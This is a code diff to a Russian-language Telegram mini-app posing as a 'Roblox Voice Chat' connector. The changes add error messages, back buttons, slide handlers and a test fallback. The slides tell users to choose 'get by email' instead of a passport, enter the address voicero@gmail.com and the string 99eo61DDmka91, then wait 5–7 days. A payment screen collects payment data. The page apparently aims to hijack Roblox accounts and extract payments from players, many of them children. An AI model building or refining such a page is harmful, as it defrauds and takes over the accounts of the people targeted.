@@ -138,6 +138,11 @@
         .hidden {
             display: none;
         }
+        
+        .error-message {
+            color: #ff4444;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -145,13 +150,14 @@
     <div class="container" id="main-screen">
         <div class="header">
             <div class="avatar">
-                <img src="https://tr.rbxcdn.com/5b3b0eabf0a2c7a0b8e1a5a5e5e5e5e5/420/420/Avatar/Png" alt="Roblox Avatar">
+                <img src="https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png" alt="Roblox Avatar" id="roblox-avatar">
             </div>
             <h2>Roblox Voice Chat</h2>
         </div>
         <div class="content">
             <div class="username" id="telegram-username"></div>
             <button class="btn" id="login-btn">Войти</button>
+            <div class="error-message" id="error-message"></div>
         </div>
     </div>
     
@@ -159,12 +165,13 @@
     <div class="container hidden" id="connect-screen">
         <div class="header">
             <div class="avatar">
-                <img src="https://cdn-icons-png.flaticon.com/512/3095/3095583.png" alt="Microphone">
+                <img src="https://cdn-icons-png.flaticon.com/512/3095/3095583.png" alt="Microphone" id="microphone-icon">
             </div>
             <h2>Подключение голосового чата</h2>
         </div>
         <div class="content">
             <button class="btn" id="connect-btn">Подключить войс-чат</button>
+            <button class="btn btn-secondary" id="back-to-main-btn">Назад</button>
         </div>
     </div>
     
@@ -176,6 +183,8 @@
         <div class="content">
             <input type="text" class="input-field" id="roblox-username" placeholder="Ваш никнейм в Roblox">
             <button class="btn" id="submit-btn">Подключить</button>
+            <button class="btn btn-secondary" id="back-to-connect-btn">Назад</button>
+            <div class="error-message" id="username-error"></div>
         </div>
     </div>
     
@@ -207,7 +216,7 @@
                 <p>Вместо паспорта выберите функцию <strong>«Получить по email»</strong></p>
                 <div class="slide-navigation">
                     <button class="btn btn-secondary" disabled>Назад</button>
-                    <button class="btn" onclick="nextSlide()">Далее</button>
+                    <button class="btn" id="next-btn-1">Далее</button>
                 </div>
                 <div class="slide-indicator">● ○ ○ ○</div>
             </div>
@@ -218,8 +227,8 @@
                 <p>Введите email:</p>
                 <p><strong>voicero@gmail.com</strong></p>
                 <div class="slide-navigation">
-                    <button class="btn btn-secondary" onclick="prevSlide()">Назад</button>
-                    <button class="btn" onclick="nextSlide()">Далее</button>
+                    <button class="btn btn-secondary" id="prev-btn-2">Назад</button>
+                    <button class="btn" id="next-btn-2">Далее</button>
                 </div>
                 <div class="slide-indicator">○ ● ○ ○</div>
             </div>
@@ -232,8 +241,8 @@
                 <p><strong>99eo61DDmka91</strong></p>
                 <p>Затем нажмите "Продолжить"</p>
                 <div class="slide-navigation">
-                    <button class="btn btn-secondary" onclick="prevSlide()">Назад</button>
-                    <button class="btn" onclick="nextSlide()">Далее</button>
+                    <button class="btn btn-secondary" id="prev-btn-3">Назад</button>
+                    <button class="btn" id="next-btn-3">Далее</button>
                 </div>
                 <div class="slide-indicator">○ ○ ● ○</div>
             </div>
@@ -243,8 +252,8 @@
                 <h3>Шаг 4 из 4</h3>
                 <p>Подождите 5-7 дней и наслаждайтесь голосовым чатом!</p>
                 <div class="slide-navigation">
-                    <button class="btn btn-secondary" onclick="prevSlide()">Назад</button>
-                    <button class="btn" onclick="finishInstructions()">Готово</button>
+                    <button class="btn btn-secondary" id="prev-btn-4">Назад</button>
+                    <button class="btn" id="finish-btn">Готово</button>
                 </div>
                 <div class="slide-indicator">○ ○ ○ ●</div>
             </div>
@@ -253,14 +262,31 @@
     
     <script>
         // Инициализация Telegram WebApp
-        const tg = window.Telegram.WebApp;
+        const tg = window.Telegram?.WebApp || {
+            initDataUnsafe: { user: { first_name: "Тестовый", username: "пользователь" } },
+            MainButton: { 
+                setText: () => {}, 
+                show: () => {}, 
+                hide: () => {},
+                onClick: () => {},
+                onEvent: () => {}
+            },
+            showAlert: (msg) => alert(msg),
+            expand: () => {},
+            ready: () => {},
+            close: () => {}
+        };
         
         // Показываем основную кнопку
         tg.MainButton.setText("Вернуться в меню");
         tg.MainButton.hide();
         
         // Получаем данные пользователя
-        const user = tg.initDataUnsafe.user;
+        const user = tg.initDataUnsafe?.user || {
+            first_name: "Тестовый",
+            username: "пользователь",
+            id: 123456789
+        };
         
         // Элементы интерфейса
         const mainScreen = document.getElementById('main-screen');
@@ -275,21 +301,51 @@
         const submitBtn = document.getElementById('submit-btn');
         const payBtn = document.getElementById('pay-btn');
         const cancelPaymentBtn = document.getElementById('cancel-payment-btn');
+        const backToMainBtn = document.getElementById('back-to-main-btn');
+        const backToConnectBtn = document.getElementById('back-to-connect-btn');
         
-        // Поле ввода
+        // Поля ввода и сообщения об ошибках
         const robloxUsername = document.getElementById('roblox-username');
+        const errorMessage = document.getElementById('error-message');
+        const usernameError = document.getElementById('username-error');
+        
+        // Кнопки слайдов
+        const nextBtn1 = document.getElementById('next-btn-1');
+        const prevBtn2 = document.getElementById('prev-btn-2');
+        const nextBtn2 = document.getElementById('next-btn-2');
+        const prevBtn3 = document.getElementById('prev-btn-3');
+        const nextBtn3 = document.getElementById('next-btn-3');
+        const prevBtn4 = document.getElementById('prev-btn-4');
+        const finishBtn = document.getElementById('finish-btn');
         
         // Устанавливаем имя пользователя Telegram
-        if (user) {
-            document.getElementById('telegram-username').textContent = 
-                user.first_name || user.username || 'Пользователь';
+        document.getElementById('telegram-username').textContent = 
+            user.first_name || user.username || 'Пользователь';
+        
+        // Предзагрузка изображений
+        function preloadImages() {
+            const images = [
+                'https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png',
+                'https://cdn-icons-png.flaticon.com/512/3095/3095583.png'
+            ];
+            
+            images.forEach(src => {
+                const img = new Image();
+                img.src = src;
+            });
         }
         
         // Обработчики событий
         loginBtn.addEventListener('click', () => {
-            mainScreen.classList.add('hidden');
-            connectScreen.classList.remove('hidden');
-            tg.MainButton.show();
+            try {
+                mainScreen.classList.add('hidden');
+                connectScreen.classList.remove('hidden');
+                tg.MainButton.show();
+                errorMessage.textContent = '';
+            } catch (e) {
+                errorMessage.textContent = 'Ошибка при переходе: ' + e.message;
+                console.error(e);
+            }
         });
         
         connectBtn.addEventListener('click', () => {
@@ -300,10 +356,11 @@
         
         submitBtn.addEventListener('click', () => {
             if (!robloxUsername.value.trim()) {
-                tg.showAlert('Пожалуйста, введите ваш никнейм в Roblox');
+                usernameError.textContent = 'Пожалуйста, введите ваш никнейм в Roblox';
                 return;
             }
             
+            usernameError.textContent = '';
             usernameScreen.classList.add('hidden');
             paymentScreen.classList.remove('hidden');
             tg.MainButton.hide();
@@ -317,8 +374,19 @@
         
         cancelPaymentBtn.addEventListener('click', () => {
             paymentScreen.classList.add('hidden');
+            usernameScreen.classList.remove('hidden');
+        });
+        
+        backToMainBtn.addEventListener('click', () => {
+            connectScreen.classList.add('hidden');
             mainScreen.classList.remove('hidden');
             tg.MainButton.hide();
+        });
+        
+        backToConnectBtn.addEventListener('click', () => {
+            usernameScreen.classList.add('hidden');
+            connectScreen.classList.remove('hidden');
+            tg.MainButton.show();
         });
         
         // Обработчик основной кнопки Telegram
@@ -354,6 +422,10 @@
                 
                 // Отправка данных на сервер (заглушка)
                 console.log('Payment data:', paymentData);
+                // fetch('https://your-server.com/api/payments', {
+                //     method: 'POST',
+                //     body: JSON.stringify(paymentData)
+                // });
             }
         }
         
@@ -361,21 +433,27 @@
         let currentSlide = 1;
         const totalSlides = 4;
         
+        function showSlide(slideNumber) {
+            if (slideNumber < 1 || slideNumber > totalSlides) return;
+            
+            document.querySelectorAll('.slide').forEach(slide => {
+                slide.classList.remove('active');
+            });
+            
+            currentSlide = slideNumber;
+            document.getElementById(`slide-${currentSlide}`).classList.add('active');
+            updateSlideIndicator();
+        }
+        
         function nextSlide() {
             if (currentSlide < totalSlides) {
-                document.getElementById(`slide-${currentSlide}`).classList.remove('active');
-                currentSlide++;
-                document.getElementById(`slide-${currentSlide}`).classList.add('active');
-                updateSlideIndicator();
+                showSlide(currentSlide + 1);
             }
         }
         
         function prevSlide() {
             if (currentSlide > 1) {
-                document.getElementById(`slide-${currentSlide}`).classList.remove('active');
-                currentSlide--;
-                document.getElementById(`slide-${currentSlide}`).classList.add('active');
-                updateSlideIndicator();
+                showSlide(currentSlide - 1);
             }
         }
         
@@ -395,9 +473,25 @@
             tg.close();
         }
         
+        // Назначение обработчиков для кнопок слайдов
+        nextBtn1.addEventListener('click', nextSlide);
+        prevBtn2.addEventListener('click', prevSlide);
+        nextBtn2.addEventListener('click', nextSlide);
+        prevBtn3.addEventListener('click', prevSlide);
+        nextBtn3.addEventListener('click', nextSlide);
+        prevBtn4.addEventListener('click', prevSlide);
+        finishBtn.addEventListener('click', finishInstructions);
+        
         // Инициализация приложения
+        preloadImages();
         tg.expand();
         tg.ready();
+        
+        // Запасной вариант для тестирования вне Telegram
+        if (!window.Telegram) {
+            console.log("Running in standalone mode (not in Telegram)");
+            document.getElementById('error-message').textContent = "Приложение запущено вне Telegram, некоторые функции могут работать ограничено";
+        }
     </script>
 </body>
 </html>
